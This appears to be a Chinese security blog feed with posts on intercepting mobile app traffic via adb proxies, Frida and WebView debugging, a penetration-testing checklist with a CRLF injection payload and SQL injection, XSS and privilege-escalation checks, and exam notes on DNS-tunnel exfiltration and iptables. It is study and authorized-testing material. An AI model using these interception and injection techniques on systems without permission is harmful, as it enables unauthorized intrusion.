<h2 id="adb操作"><a href="#adb操作" class="headerlink" title="adb操作"></a>adb操作</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#设置全局代理</span><br><span class="line">adb shell settings put global http_proxy 127.0.0.1:8080</span><br><span class="line">#开启端口映射</span><br><span class="line">adb reverse tcp:8080 tcp:8080</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#取消代理</span><br><span class="line">adb shell settings put global http_proxy :0</span><br><span class="line">#取消映射</span><br><span class="line">adb reverse --remove-all</span><br><span class="line"></span><br><span class="line">#上传</span><br><span class="line">adb push &lt;本地文件路径&gt; &lt;手机路径&gt;</span><br><span class="line">#下载</span><br><span class="line">adb pull &lt;手机路径&gt; &lt;本地路径&gt;</span><br></pre></td></tr></table></figure>

<h2 id="手机设置代理服务器"><a href="#手机设置代理服务器" class="headerlink" title="手机设置代理服务器"></a>手机设置代理服务器</h2><p>推荐软件</p>
<p><a href="https://github.com/ginuerzh/gost">gost</a>(root)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#监听10808端口</span></span><br><span class="line">./gost -L socks5://0.0.0.0:10808  &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/2dust/v2rayNG">v2rayn</a>(最新)</p>
<p>配置文件：</p>
<p><a href="https://github.com/cliayn/cliayn.github.io/blob/master/tool/v2rayNG-phone-json/test.json">https://github.com/cliayn/cliayn.github.io/blob/master/tool/v2rayNG-phone-json/test.json</a></p>
<h1 id="4-测试方法"><a href="#4-测试方法" class="headerlink" title="4-测试方法"></a>4-测试方法</h1><p>1.找到app的密钥和服务器证书和客户端证书，向外联ip直接测试【困难】</p>
<p>​	如果能够获取到App内部的密钥和证书，那么我们可以模拟客户端直接与服务器进行TLCP通信。但这通常需要逆向工程来提取这些材料，而且如果App做了保护，可能比较困难。另外，如果通信过程中有客户端证书认证，那么我们需要同时获取客户端证书和私钥。如果成功，这种方法可以直接模拟客户端与服务器通信，进行自动化测试。</p>
<p>2.frida找到发包的网络库hook，然后测试【容易】</p>
<p>​	使用Frida hook网络库，可以拦截和修改App发出的请求，从而观察和测试通信。这种方法不需要获取证书和密钥，但需要知道App使用的是什么网络库，以及如何hook。对于TLCP这种协议，如果网络库是标准的（如OpenSSL、GMSSL等），那么可能有现成的hook方法。这种方法可以动态分析App的通信，也可以修改通信数据，进行安全测试。</p>
<p>3.用app内的调试模式进行测试【极简】—【无需root】</p>
<p>​	如果App有调试模式，那么可能可以通过调试模式获取更多的日志信息或者直接进行测试。这需要App本身支持，并且通常需要知道如何开启调试模式。如果调试模式能够提供详细的通信日志或者允许我们直接本地发送测试请求，那么这将是最简单的方法。</p>
<h1 id="5-具体落实"><a href="#5-具体落实" class="headerlink" title="5-具体落实"></a>5-具体落实</h1><h2 id="①调试情况（无需root）"><a href="#①调试情况（无需root）" class="headerlink" title="①调试情况（无需root）"></a>①调试情况（无需root）</h2><p>需要<a href="https://dl.google.com/android/repository/platform-tools-latest-windows.zip"><code>adb</code></a></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>1.手机对外开启一个代理服务器0.0.0.0:10808</p>
<p>2.局域网设备通过代理服务器访问手机app的进程监听ip:port&#x3D;&gt;127.0.0.1:2222</p>
<p>3.数据包可以通过手机app的调试模式(webview)获得，可以进行接口测试</p>
<p>自动化测试最好还是需要root</p>
<h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p>1&gt;打开手机调试模式</p>
<p>注：要先点击版本号打开开发者选项</p>
<p><img src="/../image/app-Debug/phone-debug.png"></p>
<p>2&gt;打开电脑Google的chrome:&#x2F;&#x2F;inspect&#x2F;#devices</p>
<p><img src="/../image/app-Debug/Google-Debug.png"></p>
<p>3&gt;打开手机app的调试开关中的xweb或者其他webview、TBS X5等，<strong>最重要的是打开webview调试</strong></p>
<p><img src="/../image/app-Debug/app-debug-1.png"></p>
<p><img src="/../image/app-Debug/app-debug-2.png"></p>
<p>4&gt;点击Google中弹出的</p>
<p><img src="/../image/app-Debug/show-debug.png"></p>
<p><img src="/../image/app-Debug/show-debug-2.png"></p>
<p>5&gt;利用postman–&gt;bp–&gt;手机代理进行测试，或者直接在调试模式下用断点和rpc远程调用测试；</p>
<h2 id="①无调试情况（需root）"><a href="#①无调试情况（需root）" class="headerlink" title="①无调试情况（需root）"></a>①无调试情况（需root）</h2><p><strong>未完待续</strong></p>
<p>参考文章：</p>
<p><a href="https://juejin.cn/post/7195489874409373755">商密TLCP协议浅析</a></p>
<p><a href="https://www.cnblogs.com/yurang/p/11505741.html">Wireshark解密HTTPS流量的两种方法</a></p>
<p><a href="https://muhe-blog.github.io/2024/04/07/%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%9B%BD%E5%AF%86%E7%AB%99%E7%82%B9%E6%8A%93%E5%8C%85%E6%B5%81%E7%A8%8B/">国密站点抓包流程</a></p>
<p>用于测试的apk举例</p>
<p><a href="https://github.com/ctfs/write-ups-2015/raw/master/seccon-quals-ctf-2015/binary/reverse-engineering-android-apk-1/rps.apk">CTF用于测试的apk-x86</a></p>
<p><a href="https://github.com/dineshshetty/Android-InsecureBankv2/releases/tag/2.3.1">银行测试apk-arm</a></p>
<h1 id="6-举例"><a href="#6-举例" class="headerlink" title="6-举例"></a>6-举例</h1><p>企业微信小程序h5：</p>
<p>测试方式：</p>
<p>1.企微app内部打开网址<a href="http://debugxweb.qq.com/?inspector=true%EF%BC%8C%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E6%A8%A1%E5%BC%8F%E5%90%8E%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AE%E6%B5%8B%E8%AF%95app%EF%BC%8C%E6%89%93%E5%BC%80chrome://inspect/#devices%E8%B0%83%E8%AF%95%E5%8D%B3%E5%8F%AF">http://debugxweb.qq.com/?inspector=true，打开调试模式后直接访问测试app，打开chrome://inspect/#devices调试即可</a></p>
<p>2.点击需要测试的小程序直接抓包，获取code等信息，直接url放到浏览器运行，可能需要放入本地cookie[iptables-需要root]</p>
]]></content>
      <categories>
        <category>Article</category>
      </categories>
      <tags>
        <tag>app-test</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试基本流程</title>
    <url>/2025/09/24/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%96%E6%8E%98%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0-前言"></a>0-前言</h1><p>​	毕业工作第二年，才明白渗透测试工程师与红队差别很大，一个是固定的漏洞排查，一个是穷尽方法的绕过。</p>
<p>​	虽然工作方式为定式，但要把具体的攻击手法转化为抽象的知识也比较困难，就像防御入侵一样，不知道随着ai的发展能不能批量的将攻击手法转化为抽象的知识，然后自动构建工具攻击或者防御。</p>
<span id="more"></span>

<h1 id="1-基本流程"><a href="#1-基本流程" class="headerlink" title="1-基本流程"></a>1-基本流程</h1><p>1&gt;领取用例</p>
<p>2&gt;默认通过</p>
<p>3&gt;排查漏洞	&#x3D;&#x3D;	常见漏洞排查	&#x3D;&#x3D;	不符合</p>
<table>
<thead>
<tr>
<th>漏洞类型</th>
<th>内容</th>
<th>注意</th>
</tr>
</thead>
<tbody><tr>
<td>cors</td>
<td>origin</td>
<td>回显存在对应字符</td>
</tr>
<tr>
<td>csrf</td>
<td>referer</td>
<td>存在且可访问</td>
</tr>
<tr>
<td><strong>信息泄露</strong></td>
<td>正则表达式匹配所有请求响应包（通常匹配url和响应体，包含js）</td>
<td>正则的构造最好用贪婪</td>
</tr>
<tr>
<td>异常回显</td>
<td>暴露的异常java类</td>
<td>java.xxx.xxx</td>
</tr>
<tr>
<td>中间件</td>
<td>403禁止访问&#x2F;异常回显的apache等中间件</td>
<td>403</td>
</tr>
<tr>
<td>业务覆盖</td>
<td>可操作理论不可操作的业务</td>
<td>id覆盖即数据覆盖</td>
</tr>
<tr>
<td>重定向</td>
<td>登录登出</td>
<td>跳转页面</td>
</tr>
<tr>
<td>步骤跳跃</td>
<td>前端认证响应</td>
<td>第二步骤无需第一步骤参数</td>
</tr>
<tr>
<td>伪造ip</td>
<td>bp插件fakeIP</td>
<td>日志查看异常ip</td>
</tr>
<tr>
<td>后台泄露</td>
<td>嵌套爆破目录</td>
<td>401状态和403状态</td>
</tr>
<tr>
<td>RCE</td>
<td>object参数的排查或者框架漏洞的排查</td>
<td>回显的中间件</td>
</tr>
<tr>
<td>sql注入</td>
<td>闭合sql语句</td>
<td>两单引号双引号的变形</td>
</tr>
<tr>
<td>未授权</td>
<td>路径的爆破</td>
<td>端口、目录、接口爆破</td>
</tr>
<tr>
<td>xss</td>
<td>页面是否解析&lt;&#x2F;&gt;页面是否存在预览pdf</td>
<td>能否直接页面注入反射</td>
</tr>
<tr>
<td>其他服务</td>
<td>排查端口开放情况</td>
<td>多个port</td>
</tr>
<tr>
<td>越权</td>
<td>水平垂直越权</td>
<td>替换token且可访问</td>
</tr>
<tr>
<td>文件上传</td>
<td>可执行文件上传</td>
<td>返回路径&#x2F;上传成功</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>其他漏洞类型</th>
<th>内容</th>
<th>注意</th>
</tr>
</thead>
<tbody><tr>
<td>伪造用户名</td>
<td>修改识别的用户名</td>
<td>如果靠token确认user就算了</td>
</tr>
<tr>
<td>源代码泄露</td>
<td>暴露copy的源代码</td>
<td>github的地址</td>
</tr>
<tr>
<td>CRLF</td>
<td>%c4%8d%c4%8a或者%0d%0a</td>
<td>回显请求体同理出现</td>
</tr>
<tr>
<td>逻辑问题</td>
<td>不能却能</td>
<td>脑袋清晰的时候测</td>
</tr>
</tbody></table>
<p>4&gt;缺陷发布</p>
<p>5&gt;生成报告</p>
<h1 id="2-细分"><a href="#2-细分" class="headerlink" title="2-细分"></a>2-细分</h1><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><h5 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h5><h6 id="js排查（内容与标题）"><a href="#js排查（内容与标题）" class="headerlink" title="js排查（内容与标题）"></a>js排查（内容与标题）</h6><h6 id="403页面（版本号）"><a href="#403页面（版本号）" class="headerlink" title="403页面（版本号）"></a>403页面（版本号）</h6><h6 id="响应包"><a href="#响应包" class="headerlink" title="响应包"></a>响应包</h6><h5 id="身份信息"><a href="#身份信息" class="headerlink" title="身份信息"></a>身份信息</h5><h5 id="报错信息"><a href="#报错信息" class="headerlink" title="报错信息"></a>报错信息</h5>]]></content>
      <categories>
        <category>Article</category>
      </categories>
      <tags>
        <tag>Test</tag>
      </tags>
  </entry>
  <entry>
    <title>软考中级纠错记录-填空题</title>
    <url>/2025/09/18/%E8%BD%AF%E8%80%83%E4%B8%AD%E7%BA%A7%E7%BA%A0%E9%94%99%E8%AE%B0%E5%BD%95-%E4%B8%8B%E5%8D%8A/</url>
    <content><![CDATA[<h1 id="0"><a href="#0" class="headerlink" title="0-"></a>0-</h1><p>错题记录（下半场题目）—软考中级（信息安全工程师）</p>
<span id="more"></span>

<h2 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h2><table>
<thead>
<tr>
<th align="left">字符类别</th>
<th align="left">规律</th>
<th align="left">十六进制 &#x2F; 十进制</th>
<th align="left">记忆技巧 &#x2F; 推导关键</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>数字 ‘0’</strong></td>
<td align="left">所有数字字符的起点</td>
<td align="left"><code>0x30</code> &#x2F; <strong>48</strong></td>
<td align="left"><strong>记住 ‘0’ 是 48</strong>。那么 ‘1’ 就是 49，以此类推到 ‘9’ 是 57。</td>
</tr>
<tr>
<td align="left"><strong>大写字母 ‘A’</strong></td>
<td align="left">大写字母的起点</td>
<td align="left"><code>0x41</code> &#x2F; <strong>65</strong></td>
<td align="left"><strong>记住 ‘A’ 是 65</strong>。那么 ‘B’ 是 66，…，‘Z’ 是 90。</td>
</tr>
<tr>
<td align="left"><strong>小写字母 ‘a’</strong></td>
<td align="left">小写字母的起点</td>
<td align="left"><code>0x61</code> &#x2F; <strong>97</strong></td>
<td align="left"><strong>记住 ‘a’ 是 97</strong>。那么 ‘b’ 是 98，…，‘z’ 是 122。</td>
</tr>
<tr>
<td align="left"><strong>空字符 (NULL)</strong></td>
<td align="left">字符串的结束标志</td>
<td align="left"><code>0x00</code> &#x2F; <strong>0</strong></td>
<td align="left">最小的值，表示空。</td>
</tr>
<tr>
<td align="left"><strong>空格 (Space)</strong></td>
<td align="left"></td>
<td align="left"><code>0x20</code> &#x2F; <strong>32</strong></td>
<td align="left">这是一个非常常见的字符，建议记住。</td>
</tr>
<tr>
<td align="left"><strong>换行 (LF, <code>\n</code>)</strong></td>
<td align="left"></td>
<td align="left"><code>0x0A</code> &#x2F; <strong>10</strong></td>
<td align="left">在编程和文本处理中极其重要。</td>
</tr>
<tr>
<td align="left"><strong>大小写差值</strong></td>
<td align="left"><strong>小写字母 - 大写字母 &#x3D; 32</strong></td>
<td align="left"><code>0x20</code></td>
<td align="left"><strong>这是最重要的规律之一！</strong> 知道了一个大写字母的码，加32就是其小写字母的码。</td>
</tr>
</tbody></table>
<h3 id="错误1-安卓的代码的考察"><a href="#错误1-安卓的代码的考察" class="headerlink" title="错误1-安卓的代码的考察"></a>错误1-安卓的代码的考察</h3><hr>
<p>第1题（案例题）：</p>
<p> 阅读下列说明和图，回答问题1至问题4,将解答填入答题纸的对应栏内。</p>
<p>【说明】<br>近期，按照网络安全审查工作安排，国家网信办会同公安部、国家安全部、自然资源部、 交通运输部、税务总局、市场监管总局等部门联合进驻某出行科技有限公司，开展网络安全 审查。移动App安全检测和个人数据安全再次成为关注焦点。<br><a href="4%E5%88%86">问题1</a></p>
<p>为保护Android系统及应用终端平台安全，Android系统在内核层、系统运行层、应用 框架层以及应用程序层采取了相应的安全措施，以尽可能地保护移动用户数据、应用程序和 设备安全。<br>在Android系统提供的安全措施中有安全沙箱、应用程序签名机制、权限声明机制、地 址空间布局随机化等。请将上述四种安全措施按照其所在层次划分填入表4-1的空(1)〜(4)。</p>
<p><img src="/../image/Soft-exam-intermediate/after/1-1.png"></p>
<p><a href="6%E5%88%86">问题2</a><br>权限声明机制为操作权限和对象之间设定了一些限制，只有把权限和对象进行绑定，才 可以有权操作对象。<br>(1) 请问Android系统的应用程序权限信息声明都在哪个配置文件中？给出该配置文件名。<br>(2) Android 系统定义的权限组包括:CALENDAR、CAMERA、CONTACTS、LOCATION、 MICROPHONE、PHONE、SENSORS、SMS、STORAGE。按照《信息安全技术移动互联 网应用程序(App)收集个人信息基本规范》，运行在Android 9.0系统中提供网络约车服务 的某某出行App可以有的最小必要权限是以上权限组的哪几个？<br>(3) 假如有移动应用A提供了如下服务AService,对应的权限描述如下：</p>
<p><img src="/../image/Soft-exam-intermediate/after/1-2.png"></p>
<p>如果其他应用B要访问该服务，应该申明使用该服务，将以下申明语句补充完整。</p>
<p><img src="/../image/Soft-exam-intermediate/after/1-3.png"></p>
<p>【问题3】(3分)<br>应用程序框架层集中了很多Android开发需要的组件，其中最主要的就是Activities、 Broadcast Receiver、Services以及Content Providers这四大组件。围绕四大组件存在很多的攻 击方法，请说明以下三种攻击分别是针对哪个组件。<br>(1) 目录遍历攻击；<br>(2) 界面劫持攻击；<br>(3) 短信拦截攻击。<br>【问题4】(2分)<br>移动终端设备常见的数据存储方式包括：<br>① SharedPreferences ；<br>② 文件存储；<br>③ SQLite数据库；<br>④ ContentProvider；<br>⑤网络存储。<br>从以上5种方式中选出Android系统支持的数据存储方式，给出对应存储方式的编号。</p>
<p>【问题1】<br>(1) 权限声明机制<br>(2)应用程序签名机制<br>(3) 安全沙箱<br>(4)地址空间布局随机化<br>【问题2】<br>(1) AndroidManifest.xml<br>(2) LOCATION、PHONE<br>(3) uses-permission<br>【问题3】<br>(1) 目录遍历攻击：Content Providers<br>(2) 界面劫持攻击：Activities<br>(3) 短信拦截攻击：Broadcast Receiver<br>【问题4】<br>①②③④⑤</p>
<p>【问题1】<br>权限声明机制就在App当中，应用程序签名机制则是属于应用框架层，安全沙箱在系统运行层，地址空间布局随机化是系统内核层实现的。</p>
<hr>
<p>【问题2】</p>
<p><img src="/../image/Soft-exam-intermediate/after/%E5%AE%89%E5%8D%93%E6%9D%83%E9%99%90%E6%96%87%E4%BB%B6.png"></p>
<p>解开App文件，在 AndroidManifest.xml中可以看到运行App所需的权限。某出行属于网约车范畴，需要地理位置和打电话权限即可。<br>Android 的权限在AndroidManifest.xml文件里配置。</p>
<p>其中有四个标签与权限有关，分别是permission, permission-group, permisson-tree, uses-permission，最常用的是uses-permission,当我们需要获取某个权限的时候，就需要在文件中声明。</p>
<p>（1）Android权限组及其常见用途：</p>
<ul>
<li>CALENDAR：访问日历事件。约车App通常不需要这个。</li>
<li>CAMERA：访问相机。可能用于扫描二维码或拍照上传，但不是核心功能。</li>
<li>CONTACTS：访问联系人。可能用于分享行程，但可能不是绝对必要，用户可以直接输入号码。</li>
<li>LOCATION：位置访问。绝对必要。</li>
<li>MICROPHONE：麦克风访问。可能用于语音输入，但不是核心功能。</li>
<li>PHONE：电话权限。可能用于读取手机状态和拨打电话。</li>
<li>SENSORS：传感器访问。可能用于检测运动，但不必要。</li>
<li>SMS：短信权限。可能用于验证码或发送短信，但验证码可以通过其他方式处理。</li>
<li>STORAGE：存储权限。可能用于缓存地图或保存数据。</li>
</ul>
<p>（2）对于网络约车服务，必要的权限可能包括：</p>
<ul>
<li>LOCATION：这是核心功能，因为需要实时位置来叫车和导航。</li>
<li>PHONE：可能需要读取手机状态（如IMEI）用于设备标识，或者拨打电话。</li>
<li>CONTACTS：可能用于分享行程或邀请联系人。</li>
<li>STORAGE：可能用于保存数据。</li>
</ul>
<p>【问题3】<br>Android系统中界面和Activities关联，因此界面劫持攻击属于Activities组件。Content Providers用来保存或获取数据，目录遍历攻击属于Content Providers。<br>Broadcast Receiver用于广播发送和接收消息，短信拦截攻击属于Broadcast Receiver。</p>
<p>–纯靠英文意思猜–</p>
<p>【问题4】<br>题干所述的5种方式全是Android支持的存储方式。</p>
<p>–没点话说–</p>
<hr>
<h3 id="错误2-wireshark-iptables的熟悉"><a href="#错误2-wireshark-iptables的熟悉" class="headerlink" title="错误2-wireshark+iptables的熟悉"></a>错误2-wireshark+iptables的熟悉</h3><hr>
<p>域名前的子域名是异常字符，推测是加密的信息，通过子域名用dns服务器将信息外带出去，而txt信息中包含ipconfig，可能所外带的信息便是ipconfig的回显</p>
<p>dns服务只要与外界沟通，非极端情况是必须开启的</p>
<p><strong>表（-t table）</strong></p>
<table>
<thead>
<tr>
<th align="left">表名</th>
<th align="left">主要功能</th>
<th align="left">内置链</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><strong>filter</strong></td>
<td align="left"><strong>过滤数据包</strong>，决定是否允许数据包通过（默认表）</td>
<td align="left">INPUT, FORWARD, OUTPUT</td>
</tr>
<tr>
<td align="left"><strong>nat</strong></td>
<td align="left">网络地址转换，用于修改数据包的源或目标地址</td>
<td align="left">PREROUTING, OUTPUT, POSTROUTING</td>
</tr>
<tr>
<td align="left"><strong>mangle</strong></td>
<td align="left">修改数据包内容（如 TOS、TTL），或给数据包打标记</td>
<td align="left">所有五个链（PREROUTING, INPUT, FORWARD, OUTPUT, POSTROUTING）</td>
</tr>
<tr>
<td align="left"><strong>raw</strong></td>
<td align="left">决定数据包是否被状态跟踪机制处理</td>
<td align="left">PREROUTING, OUTPUT</td>
</tr>
</tbody></table>
<p><strong>命令选项（Command Options）</strong></p>
<p>指定要对规则进行的操作，如添加、删除、查看等。</p>
<table>
<thead>
<tr>
<th align="left">命令选项</th>
<th align="left">全称</th>
<th align="left">功能说明</th>
</tr>
</thead>
<tbody><tr>
<td align="left"><code>-A</code></td>
<td align="left"><code>--append</code></td>
<td align="left"><strong>追加</strong>一条规则到链的末尾</td>
</tr>
<tr>
<td align="left"><code>-I</code></td>
<td align="left"><code>--insert</code></td>
<td align="left"><strong>插入</strong>一条规则到链的指定位置（默认为链首）</td>
</tr>
<tr>
<td align="left"><code>-D</code></td>
<td align="left"><code>--delete</code></td>
<td align="left"><strong>删除</strong>链中的一条规则</td>
</tr>
<tr>
<td align="left"><code>-R</code></td>
<td align="left"><code>--replace</code></td>
<td align="left"><strong>替换</strong>链中的一条规则</td>
</tr>
<tr>
<td align="left"><code>-L</code></td>
<td align="left"><code>--list</code></td>
<td align="left"><strong>列出</strong>链中的所有规则</td>
</tr>
<tr>
<td align="left"><code>-F</code></td>
<td align="left"><code>--flush</code></td>
<td align="left"><strong>清空</strong>链中的所有规则（刷掉）</td>
</tr>
<tr>
<td align="left"><code>-Z</code></td>
<td align="left"><code>--zero</code></td>
<td align="left">将链的计数器清零（与 <code>-L</code> 一起用可看清零前的统计）</td>
</tr>
<tr>
<td align="left"><code>-P</code></td>
<td align="left"><code>--policy</code></td>
<td align="left">设置链的<strong>默认策略</strong>（ACCEPT, DROP, REJECT）</td>
</tr>
<tr>
<td align="left"><code>-N</code></td>
<td align="left"><code>--new-chain</code></td>
<td align="left">创建一条新的用户自定义链</td>
</tr>
<tr>
<td align="left"><code>-X</code></td>
<td align="left"><code>--delete-chain</code></td>
<td align="left">删除一条用户自定义链（必须为空）</td>
</tr>
<tr>
<td align="left"><code>-E</code></td>
<td align="left"><code>--rename-chain</code></td>
<td align="left">重命名一条用户自定义链</td>
</tr>
</tbody></table>
<p><strong>综合示例</strong></p>
<ol>
<li><p><strong>允许所有已建立的连接</strong>：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>开放本机的SSH（22）、HTTP（80）、HTTPS（443）端口</strong>：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp -m multiport --dports <span class="number">22</span>,<span class="number">80</span>,<span class="number">443</span> -m state --state NEW -j ACCEPT</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>允许Ping（ICMP回声请求）</strong>：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p icmp --icmp-<span class="built_in">type</span> <span class="number">8</span> -j ACCEPT</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>设置默认策略为拒绝，并记录被拒绝的包</strong>：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">iptables -P INPUT DROP</span><br><span class="line">iptables -A INPUT -j LOG --log-prefix &quot;IPTABLES-DROPPED: &quot; # 先记录</span><br><span class="line">iptables -A INPUT -j DROP # 再丢弃</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>端口转发（将到达本机8080端口的流量转发到192.168.1.10的80端口）</strong>：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --dport <span class="number">8080</span> -j DNAT --to-destination <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">10</span>:<span class="number">80</span></span><br></pre></td></tr></table></figure></li>
</ol>
<hr>
<p> 阅读下列说明和图，回答问题1至问题5，将解答填入答题纸的对应栏内。<br>【说明】<br>域名系统是网络空间的中枢神经系统，其安全性影响范围大，也是网络攻防的重点。李 工在日常的流量监控中，发现以下可疑流量，请协助分析其中可能的安全事件。</p>
<p><img src="/../image/Soft-exam-intermediate/after/wireshark%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A51.png"></p>
<p><a href="4%E5%88%86">问题1</a><br>域名系统采用授权的分布式数据查询系统，完成域名和IP地址的解析。李工通过上述 流量可以判断域名解析是否正常、有无域名劫持攻击等安全事件发生。<br>(1) 域名系统的服务端程序工作在网络的哪一层？<br>(2) 图3-1中的第一个网络分组要解析的域名是什么？<br>(3) 给出上述域名在DNS查询包中的表示形式(16进制)。<br>(4) 由图3-1可知李工所在单位的域名服务器的IP地址是什么？<br><a href="2%E5%88%86">问题2</a><br>鉴于上述DNS协议分组包含大量奇怪的子域名，如想知道是哪个应用程序发送的上述 网络分组，请问在Windows系统下，李工应执行哪条命令以确定上述DNS流量来源？<br><a href="6%E5%88%86">问题3</a><br>通过上述的初步判断，李工认为192.168.229.1的计算机可能己经被黑客所控制(CC攻 击)。黑客惯用的手法就是建立网络隐蔽通道，也就是指利用网络协议的某些字段秘密传输 信息，以掩盖恶意程序的通信内容和通信状态。<br>(1) 请问上述流量最有可能对应的恶意程序类型是什么？<br>(2) 上述流量中隐藏的异常行为是什么？请简要说明。<br>(3) 信息安全目标包括保密性、完整性、不可否认性、可用性和可控性。请问上述流量 所对应的网络攻击违反了信息安全的哪个目标？<br><a href="6%E5%88%86">问题4</a><br>通过上述的攻击流分析，李工决定用防火墙隔离该计算机。李工所运维的防火墙是 Ubuntu系统自带的iptables防火墙。<br>(1) 请问iptables默认实现数据包过滤的表是什么？该表默认包含哪几条链？<br>(2) 李工首先要在iptables防火墙中查看现有的过滤规则，请给出该命令。<br>(3) 李工要禁止该计算机继续发送DNS数据包，请给出相应过滤规则。 <br>【问题5】（2分）<br>在完成上述处置以后，李工需要分析事件原因，请说明导致DNS成为CC攻击的首选 隐蔽传输通道协议的原因。</p>
<p>【问题1】<br>(1) 应用层<br>(2) <a href="http://www.humen.com/">www.humen.com</a><br>(3) 7777770568756d656e03636f6d<br>(4) 192.168.229.133<br>【问题2】<br>由流量的源端口号和netstat&#x2F;b对应的进程关联即可得知<br>【问题3】<br>(1) 特洛伊木马<br>(2) 执行ipconfig命令，回传网络信息<br>(3) 机密性<br>【问题4】<br>(1) filter； INPUT, FORWARD, OUTPUT<br>(2) iptables -L<br>(3) iptables -I INPUT -s 192.168.229.1 -j DROP<br>【问题5】<br>放行</p>
<p>【问题1】<br>域名协议是典型的网络应用，工作在应用层。<br>从Wireshark第一个分组中的info栏可以明确得知其查询的域名为<a href="http://www.humen.com.而且从图中下半部分可以知道上述域名的编码方法,分别是长度+每一级域名的ascii/">www.humen.com。而且从图中下半部分可以知道上述域名的编码方法，分别是长度+每一级域名的ASCII</a> 码。字母w的ASCII 码值可以从图中t的ASCII 码值（十六进制74）推导出来，为77，字母a的ASCII码值为十六进制61，因此com的 ASCII码值为636f6d，以此类推。<br>域名解析的目的IP地址就是域名服务器的IP地址。所以查看查询分组的目的地址即可，即李工所在单位的域名服务器的P地址为192.168.229.133。<br>【问题2】<br>由流量的源端口号和netstat&#x2F;b对应的进程关联，即可得知 DNS流量来源。</p>
<p>【问题3】<br>病毒是能够自我复制和传播的代码片段，通常病毒无法远程控制。<br>蠕虫也是一种类似病毒的计算机程序，但它不会去修改其他程序，它越来越多地自我复制导致计算机系统变慢。蠕虫可以进行远程控制。<br>特洛伊木马不会像病毒和蠕虫那样自我复制。它具备很好的隐藏能力，悄悄地窃取用户的重要信息。根据题目所给信息（具有远程控制功能、隐蔽通信、窃取敏感信息)，判断其属于特洛伊木马。<br>题目所给出的是域名的 TXT记录，在该记录的最后包含命令信息，从图中最下面一行可知执行的是ipconfig命令。<br>【问题4】<br>iptables 的4表5链当中，filter表是负责过滤的，其包含INPUT, OUTPUT和转发FORWARD。<br>查看选项是list的缩写L。<br>对隧道流量可以禁止（丢弃，DROP）其发送的所有流量，只要其源IP地址为攻击者的机器。<br>【问题5】<br>只要计算机能够上网，DNS域名系统就必须是放行的，不会被安全设备所拦截，这就是最根本的原因。</p>
<h3 id="错误3-日志分析"><a href="#错误3-日志分析" class="headerlink" title="错误3-日志分析"></a>错误3-日志分析</h3><hr>
<p> 阅读下列说明，回答问题1至问题5，将解答填入对应栏内。<br>【说明】<br>通常由于机房电磁环境复杂，运维人员很少在现场进行运维工作，在出现安全事件需要 紧急处理时，需要运维人员随时随地远程开展处置工作。<br>SSH（安全外壳协议）是一种加密的网络传输协议，提供安全方式访问远程计算机。李工作为公司的安全运维工程师，也经常使用SSH远程登录到公司的Ubuntu18.04服务器中进 行安全维护。<br>【问题1】（2分）<br>SSH协议默认工作的端口号是多少？<br>【问题2】（2分）<br>网络设备之间的远程运维可以采用两种安全通信方式：一种是SSH，还有一种是什么？<br> 【问题3】（4分）<br>日志包含设备、系统和应用软件的各种运行信息，是安全运维的重点关注对象。李工在 定期巡检服务器的SSH日志时，发现了以下可疑记录：</p>
<p><img src="/../image/Soft-exam-intermediate/after/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90.png"></p>
<p>（1）请问李工打开的是系统的哪个日志文件？请给出该文件名字。<br>（2）李工怀疑有黑客在攻击该系统，请给出判断攻击成功与否的命令以便李工评估攻击 的影响。<br>【问题4】（10分）<br>经过上次SSH的攻击事件之后，李工为了加强口令安全，降低远程连接风险，考虑采 用免密证书登录。<br>（1）Linux系统默认不允许证书方式登录，李工需要实现免密证书登录的功能，应该修 改哪个配置文件？请给出文件名。<br>（2）李工在创建证书后需要拷贝公钥信息到服务器中。他在终端输入了以下拷贝命令， 请说明命令中“&gt;&gt;”的含义。<br>ssh xiaoming@server cat &#x2F;home&#x2F;xiaoming&#x2F;.ssh&#x2F;id_rsa.pub&gt;&gt;authorized_keys<br>（3）服务器中的authorized_keys文件详细信息如下，请给出该文权限的数字表示。</p>
<p><img src="/../image/Soft-exam-intermediate/after/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%902.png"></p>
<p>（4）李工完成SSH配置修改后需要重启服务，请给出systemctl重启SSH服务的命令。<br>（5）在上述服务配置过程中，配置命令中可能包含各种敏感信息，因此在配置结束后应 该及时清除历史命令信息，请给出清除系统历史记录应执行的命令。</p>
